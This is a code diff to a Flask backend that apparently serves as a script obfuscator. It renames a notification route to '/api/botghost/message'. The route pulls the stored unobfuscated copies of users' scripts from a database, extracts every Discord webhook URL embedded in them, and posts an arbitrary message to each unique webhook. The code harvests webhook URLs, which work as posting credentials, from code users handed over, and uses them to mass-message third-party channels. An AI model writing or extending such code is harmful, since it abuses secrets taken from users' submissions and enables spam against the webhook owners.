@@ -374,13 +374,16 @@ def proxy_webhook(webhook_id):
 
     return jsonify({"status": "forwarded", "response_status": response.status_code}), response.status_code
 
-@app.route('/notify', methods=['POST'])
-def notify():
-    data = request.json
-    message = data.get("message")
+@app.route('/api/botghost/message', methods=['POST'])
+def botghost_message():
+    data = request.get_json()
 
+    if not data or "text" not in data:
+        return jsonify({"status": "error", "message": "Missing 'text' parameter in JSON body."}), 400
+
+    message = data["text"].strip()
     if not message:
-        return jsonify({"status": "error", "message": "Missing 'message' parameter."}), 400
+        return jsonify({"status": "error", "message": "Empty message."}), 400
 
     try:
         res = supabase.table("scripts").select("unobfuscated").execute()
@@ -391,29 +394,30 @@ def notify():
         return jsonify({"status": "error", "message": "No scripts found."}), 404
 
     webhook_pattern = r"https:\/\/discord\.com\/api\/webhooks\/[^\s\"']+"
+    sent_count = 0
     found_webhooks = set()
 
     for row in res.data:
-        content = row.get("unobfuscated", "")
-        matches = re.findall(webhook_pattern, content)
-        found_webhooks.update(matches)
-
-    success = 0
-    for webhook_url in found_webhooks:
-        try:
-            response = requests.post(webhook_url, json={"content": message})
-            if response.ok:
-                success += 1
-        except Exception as e:
-            print(f"[ERROR] Failed to send to {webhook_url}: {e}")
+        unobfuscated = row.get("unobfuscated", "")
+        matches = re.findall(webhook_pattern, unobfuscated)
+        for webhook_url in matches:
+            webhook_url = webhook_url.strip()
+            if webhook_url not in found_webhooks:
+                try:
+                    response = requests.post(webhook_url, json={"content": message})
+                    if response.ok:
+                        sent_count += 1
+                        found_webhooks.add(webhook_url)
+                except Exception as e:
+                    print(f"[ERROR] Failed to send to {webhook_url}: {e}")
 
     return jsonify({
-        "status": "done",
+        "status": "success",
         "message_sent": message,
-        "sent_count": success,
-        "total_webhooks_found": len(found_webhooks)
-    })
-
+        "sent_to": sent_count,
+        "total_unique_webhooks": len(found_webhooks)
+    }), 200
+    
 @app.route('/api/obfuscate', methods=['POST'])
 def api_obfuscate():
     if not request.is_json:
